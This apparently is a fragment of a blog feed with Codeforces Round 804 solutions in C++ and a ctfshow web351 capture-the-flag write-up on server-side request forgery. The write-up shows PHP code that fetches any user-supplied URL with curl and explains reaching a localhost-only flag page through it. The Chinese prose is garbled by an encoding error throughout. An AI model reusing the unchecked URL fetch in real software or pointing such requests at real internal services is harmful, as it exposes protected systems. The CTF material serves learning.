class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">if</span>(n%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1 1 %d\n&quot;</span>,(n/<span class="number">2</span>)^<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;-1\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Bit-Flipping"><a href="#B-Bit-Flipping" class="headerlink" title="B. Bit Flipping"></a>B. Bit Flipping</h2><h3 id="é¢˜ç›®æè¿°ï¼š-1"><a href="#é¢˜ç›®æè¿°ï¼š-1" class="headerlink" title="é¢˜ç›®æè¿°ï¼š"></a>é¢˜ç›®æè¿°ï¼š</h3><p><img src="/2022/07/05/Codeforces%20Round%20804(Div.2)/2.png" alt="2"></p><h3 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿™ä¸ªé¢˜ç›®å°±æ˜¯è¯´ï¼Œæ„é€ ä¸€ä¸ªç»™å®šé•¿åº¦çš„çŸ©é˜µï¼ŒçŸ©é˜µçš„æ¯ä¸ªæ ¼å­å€¼ä¸º0æˆ–è€…1ï¼Œè¦æ±‚å¯¹äºæ¯ä¸€ä¸ªæ ¼å­ï¼Œéƒ½æœ‰ä¸¤ä¸ªç›¸é‚»çš„ä¸ä¹‹é¢œè‰²ä¸ä¸€æ ·çš„æ ¼å­ï¼Œå¹¶ä¸”åªèƒ½æœ‰ä¸¤ä¸ªã€‚</p><p>å¤§éƒ¨åˆ†åŒå­¦å¯èƒ½æ‰¾è§„å¾‹ï¼Œä½†æ˜¯æˆ‘åé¢æƒ³åˆ°äº†ä¸€ä¸ªé€’æ¨çš„æ–¹å¼ï¼Œä»å°çš„çŸ©é˜µæ‰©å±•ã€‚å› ä¸ºå·²æœ‰çš„çŸ©é˜µå¿…ç„¶æ»¡è¶³ä»¥ä¸Šæ¡ä»¶ï¼Œå› æ­¤å¦‚æœå¯¹çŸ©é˜µè¿›è¡Œæ‰©å±•ï¼Œé‚£ä¹ˆæ‰©å±•çš„ä¸€åˆ—å¿…é¡»å’Œè¢«æ‰©å±•çš„é‚£ä¸€åˆ—å€¼ä¸€æ¨¡ä¸€æ ·ï¼Œç”±äºå®½é«˜éƒ½ä¸ºå¶æ•°ï¼Œå› æ­¤æˆ‘ä»¬å†æ¬¡æ‰©å……çš„ä¸€åˆ—å¿…é¡»ä¸è¢«æ‰©å±•åˆ—å®Œå…¨ç›¸åã€‚å¦‚æ­¤ä¸€æ¥è¾¾åˆ°äº†æˆ‘ä»¬æ‰€æ„é€ çš„ç›®æ ‡ï¼Œæˆ‘ä»¬æœ€ç»ˆæ„é€ çš„å›¾å½¢ä¸º</p><p><img src="/2022/07/05/Codeforces%20Round%20804(Div.2)/3.png" alt="3"></p><p>åˆå§‹åŒ–ä¹‹åï¼Œæ ¹æ®é•¿å®½è¾“å‡ºå°±å¯ä»¥äº†ã€‚</p><h3 id="æ ‡ç¨‹-1"><a href="#æ ‡ç¨‹-1" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 52</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn][maxn];</span><br><span class="line"><span class="keyword">int</span> dx[]=&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;,dy[]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">queue&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt;q;<span class="comment">//y,x</span></span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> m)</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=m;j++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,a[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;n,&amp;m);<span class="comment">//ÃÃÃÃ </span></span><br><span class="line">    <span class="comment">//memset(a,-1,sizeof(a));</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(n,m);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    a[<span class="number">1</span>][<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">    a[<span class="number">1</span>][<span class="number">2</span>]=<span class="number">0</span>;</span><br><span class="line">    a[<span class="number">2</span>][<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    a[<span class="number">2</span>][<span class="number">2</span>]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">3</span>;i&lt;=<span class="number">50</span>;i+=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">2</span>;j+=<span class="number">2</span>)&#123;</span><br><span class="line">            a[i][j]=a[i<span class="number">-1</span>][j];</span><br><span class="line">            a[i][j+<span class="number">1</span>]=a[i<span class="number">-1</span>][j+<span class="number">1</span>];</span><br><span class="line">            a[i+<span class="number">1</span>][j]=!a[i<span class="number">-1</span>][j];</span><br><span class="line">            a[i+<span class="number">1</span>][j+<span class="number">1</span>]=!a[i<span class="number">-1</span>][j+<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">50</span>;i+=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">3</span>;j&lt;=<span class="number">50</span>;j+=<span class="number">2</span>)&#123;</span><br><span class="line">            a[i][j]=a[i][j<span class="number">-1</span>];</span><br><span class="line">            a[i+<span class="number">1</span>][j]=a[i+<span class="number">1</span>][j<span class="number">-1</span>];</span><br><span class="line">            a[i][j+<span class="number">1</span>]=!a[i][j<span class="number">-1</span>];</span><br><span class="line">            a[i+<span class="number">1</span>][j+<span class="number">1</span>]=!a[i+<span class="number">1</span>][j<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Line-Empire"><a href="#C-Line-Empire" class="headerlink" title="C. Line Empire"></a>C. Line Empire</h2><h3 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/07/05/Codeforces%20Round%20804(Div.2)/4.png" alt="4"></p><h3 id="é¢˜ç›®åˆ†æ-2"><a href="#é¢˜ç›®åˆ†æ-2" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿™ä¸ªé¢˜ç›®çš„æ„æ€æ˜¯ï¼Œæ±‚ç¬¦åˆæ¡ä»¶çš„æ’åˆ—æ•°é‡ï¼Œè¦æ±‚ä»»æ„å­åŒºé—´å†…ï¼Œæ»¡è¶³æœªå‡ºç°è¿‡çš„æœ€å°å€¼ç›¸åŒï¼Œæ±‚æ’åˆ—æ•°ã€‚å…ˆè€ƒè™‘ä¸€ä¸ªé—®é¢˜ï¼Œé¦–å…ˆ0çš„ä½ç½®ä¸€å®šè¦ç›¸ç­‰ï¼Œå› ä¸ºæ²¡æœ‰åŒ…æ‹¬0ï¼Œé‚£ä¹ˆç»“æœä¸€å®šä¸º0ï¼ŒåŒ…æ‹¬äº†0ï¼Œç»“æœä¸€å®šä¸ä¸º0ã€‚é‚£ä¹ˆå†è€ƒè™‘1ï¼Œè‹¥åŒºé—´åŒæ—¶åŒ…æ‹¬0å’Œ1ï¼Œé‚£ä¹ˆç»“æœä¸€å®šä¸ä¸º1ï¼Œå› æ­¤1çš„ä½ç½®ä¹Ÿå¿…é¡»ç›¸åŒã€‚é‚£ä¹ˆå†è€ƒè™‘2ï¼ŒåŒæ ·ï¼ŒåŒºé—´éœ€è¦åŒ…æ‹¬0ï¼Œ1ï¼Œ2æ—¶ï¼Œç»“æœæ‰ä¸ä¸º2åŠä»¥ä¸‹çš„å€¼ï¼Œä½†æ˜¯è¿™ä¸ªæ—¶å€™å°±æœ‰ä¸¤ç§æƒ…å†µï¼Œ2åœ¨0å’Œ1ä¹‹é—´æˆ–è€…2ä¸åœ¨0å’Œ1ä¹‹é—´ã€‚è‹¥åœ¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åœ¨0~1çš„ä½ç½®å†…ä»»æ„æ”¾ç½®2ï¼Œå› ä¸ºæˆ‘ä»¬è‹¥æƒ³åŒæ—¶åŒ…æ‹¬0å’Œ1ï¼Œåˆ™å¿…é¡»åŒ…æ‹¬2ï¼Œé‚£ä¹ˆè¿™ä¸ªæ—¶å€™ï¼Œ2å°±å¯ä»¥åœ¨åŒºé—´å†…ä»»æ„ä½ç½®ï¼Œå¯¹æ–¹æ¡ˆæ•°åšå‡ºè´¡çŒ®ã€‚å¦‚æœä¸åœ¨ï¼Œé‚£ä¹ˆ2åŒæ ·ä¹Ÿåªèƒ½å›ºå®šä½ç½®ã€‚ä»¥æ­¤ç±»æ¨ï¼Œæˆ‘ä»¬è®¾ç½®ä¸€ä¸ªåŒºé—´ï¼Œè‹¥æ•°åœ¨åŒºé—´å¤–ï¼Œåˆ™æ‰©å±•åŒºé—´ï¼Œè‹¥åœ¨åŒºé—´å†…ï¼Œåˆ™åŒºé—´å†…å‰©ä½™çš„ä½ç½®éƒ½å¯ä»¥æ”¾ç½®ã€‚</p><h3 id="æ ‡ç¨‹-2"><a href="#æ ‡ç¨‹-2" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 500002</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> mod=<span class="number">1e9</span>+<span class="number">7</span>;</span><br><span class="line"><span class="keyword">int</span> dx[]=&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;,dy[]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">queue&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt;q;<span class="comment">//y,x</span></span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;m);</span><br><span class="line">        a[m]=i;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">int</span> l=a[<span class="number">0</span>],r=a[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">int</span> range=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">bool</span> flag=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(a[i]&gt;r)&#123;</span><br><span class="line">            r=a[i];</span><br><span class="line">            flag=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(a[i]&lt;l)&#123;</span><br><span class="line">            l=a[i];</span><br><span class="line">            flag=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        range=r-l;</span><br><span class="line">        <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">            ans*=(range-i+<span class="number">1</span>);</span><br><span class="line">            ans%=mod;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">//init();</span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>å•¥ä¹Ÿä¸è¯´äº†ï¼ŒçŒ›ç»ƒå§ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> codeforces </category>
          
          <category> é¢˜è§£ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshowåˆ·é¢˜è®°å½•-web351</title>
      <link href="/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web351/"/>
      <url>/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web351/</url>
      
        <content type="html"><![CDATA[<p>ä»Šå¤©å­¦å­¦ <code>ssrf</code>ï¼Œæœ‰äº›æœåŠ¡å™¨çš„æŸäº›èµ„æºå¯èƒ½ä¼šè§„å®šè¯·æ±‚å¿…é¡»æ¥è‡ªå†…ç½‘æ‰èƒ½è®¿é—®èµ„æºï¼Œå¦‚æœä¸æ˜¯å†…ç½‘ç”¨æˆ·åˆ™ä¼šè¢«æ‹’ï¼Œè€Œ <code>ssrf</code> å°±èƒ½ä¸ºæˆ‘ä»¬æä¾›ä¸€ä¸ªå†…ç½‘è®¿é—®çš„é€šé“ã€‚</p><span id="more"></span><h2 id="æµ…æssrf"><a href="#æµ…æssrf" class="headerlink" title="æµ…æssrf"></a>æµ…æssrf</h2><blockquote><p>åœ¨è®¡ç®—æœºå®‰å…¨ä¸­ï¼ŒæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼ˆè‹±è¯­ï¼šServer-side Request Forgeryï¼Œç®€ç§°SSRFï¼‰æ˜¯æ”»å‡»è€…æ»¥ç”¨æœåŠ¡å™¨åŠŸèƒ½æ¥è®¿é—®æˆ–æ“ä½œæ— æ³•è¢«ç›´æ¥è®¿é—®çš„ä¿¡æ¯çš„æ–¹å¼ä¹‹ä¸€</p></blockquote><p>åœ¨ä¹‹å‰åšè¿‡çš„é¢˜ç›®ç§ï¼Œæˆ‘ä»¬å·²ç»åˆæ­¥æ¥è§¦è¿‡æœ¬åœ°ç½‘é¡µé™åˆ¶è®¿é—®èµ„æºçš„ä¾‹å­ï¼Œä½†æ˜¯æˆ‘ä»¬éƒ½å¯ä»¥ä¼ªé€ ï¼Œæ¯”å¦‚ <code>referer</code> å­—æ®µæˆ–è€…æ˜¯ <code>X-Forwarded-for</code> å­—æ®µï¼Œå› ä¸ºåŒ…å«åœ¨æˆ‘ä»¬è¯·æ±‚çš„ <code>headers</code> ä¸­ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ç›´æ¥ä¼ªé€ ã€‚ä½†æ˜¯ <code>$_SERVER</code> å°±æ˜¯æˆ‘ä»¬æ‰€ä¸èƒ½ä¼ªé€ çš„äº†ï¼Œè¿™ä¸ªå˜é‡æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ</p><blockquote><p>$_SERVER æ˜¯ä¸€ä¸ªåŒ…å«äº†è¯¸å¦‚å¤´ä¿¡æ¯(header)ã€è·¯å¾„(path)ã€ä»¥åŠè„šæœ¬ä½ç½®(script locations)ç­‰ç­‰ä¿¡æ¯çš„æ•°ç»„ã€‚è¿™ä¸ªæ•°ç»„ä¸­çš„é¡¹ç›®ç”± Web æœåŠ¡å™¨åˆ›å»ºã€‚ä¸èƒ½ä¿è¯æ¯ä¸ªæœåŠ¡å™¨éƒ½æä¾›å…¨éƒ¨é¡¹ç›®ï¼›æœåŠ¡å™¨å¯èƒ½ä¼šå¿½ç•¥ä¸€äº›ï¼Œæˆ–è€…æä¾›ä¸€äº›æ²¡æœ‰åœ¨è¿™é‡Œåˆ—ä¸¾å‡ºæ¥çš„é¡¹ç›®ã€‚è¿™ä¹Ÿå°±æ„å‘³ç€å¤§é‡çš„æ­¤ç±»å˜é‡éƒ½ä¼šåœ¨<a href="http://www.faqs.org/rfcs/rfc3875">Â» CGI 1.1 è§„èŒƒ</a>ä¸­è¯´æ˜ï¼Œæ‰€ä»¥åº”è¯¥ä»”ç»†ç ”ç©¶ä¸€ä¸‹ã€‚</p></blockquote><p>æ‰€ä»¥æˆ‘ä»¬å¯¹ <code>SERVER</code> å˜é‡è¿›è¡Œæ ¡éªŒå³å¯åˆ¤æ–­è¯·æ±‚æ˜¯å¦æ¥è‡ªæœ¬åœ°ï¼Œå¦‚æœä¸æ¥è‡ªæœ¬åœ°åˆ™ç›´æ¥æ‹’ç»æ‰ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_ADDR&#x27;</span>]!==<span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;éæœ¬åœ°è®¿é—®&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&#x27;flag&#123;test_flag&#125;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°æ˜¯æ— æ³•è®¿é—®çš„ã€‚</p><p><img src="/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web351/1.png" alt="1"></p><p>åªæœ‰æˆ‘ä»¬åœ¨æœ¬æœºä½¿ç”¨ç¯å›åœ°å€æ‰èƒ½è®¿é—®æˆåŠŸã€‚</p><p><img src="/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web351/2.png" alt="2"></p><p>é‚£ä¹ˆæˆ‘ä»¬æœ€ä¸»è¦å°±æ˜¯å¦‚ä½•è®©æœåŠ¡å™¨ä»£æˆ‘ä»¬å‘èµ·è¯·æ±‚ï¼Œå¦‚æœèƒ½ä»£æˆ‘ä»¬å‘èµ·è¯·æ±‚ï¼Œé‚£å°±ä¼šé€ æˆç»™ <code>ssrf</code>ã€‚</p><h2 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span>=curl_init(<span class="variable">$url</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸€æ­¥ä¸€æ­¥è§£è¯»ã€‚</p><p>ç¬¬ä¸€ä¸ªä» <code>url</code> å‚æ•°ä¸­è·å– <code>url</code>ã€‚</p><ul><li><code>curl_init</code>ï¼šåˆå§‹åŒ–ä¸€ä¸ª <code>cURL</code> ä¼šè¯ï¼Œå‚æ•°å¯ä»¥ä¸ºç©ºï¼Œæˆ–è€…ä¸ºä¸€ä¸ª <code>url</code></li><li><code>curl_setopt</code>ï¼šè®¾ç½® <code>cURL</code> ä¼šè¯çš„ä¸€äº›å±æ€§ã€‚</li><li><code>curl_exec</code>ï¼šæ ¹æ®å‚æ•°é€‰é¡¹æ‰§è¡Œ <code>curl</code> å‘½ä»¤ï¼Œå¹¶æŠŠç»“æœè¿”å›ç»™æµè§ˆå™¨ã€‚</li><li><code>curl_close</code>ï¼šå…³é—­ä¼šè¯</li></ul><p>å°±æ˜¯ç›´æ¥å¯ä»¥è¯·æ±‚ä¸€ä¸ªç½‘é¡µï¼Œç„¶åå¯ä»¥å‘ç°åº•ä¸‹æœ‰ <code>flag.php</code>ï¼Œä½†æ˜¯åªæœ‰æœ¬åœ°èƒ½è®¿é—®ï¼Œå› æ­¤åœ¨è¿™é‡Œæˆ‘ä»¬è®© <code>curl</code> å»è¯·æ±‚ <code>127.0.0.1/flag.php</code> å³å¯ã€‚</p><p><img src="/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web351/3.png" alt="3"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> web </category>
          
          <category> ssrf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshowåˆ·é¢˜è®°å½•-web258</title>
      <link href="/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web258/"/>
      <url>/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web258/</url>
      
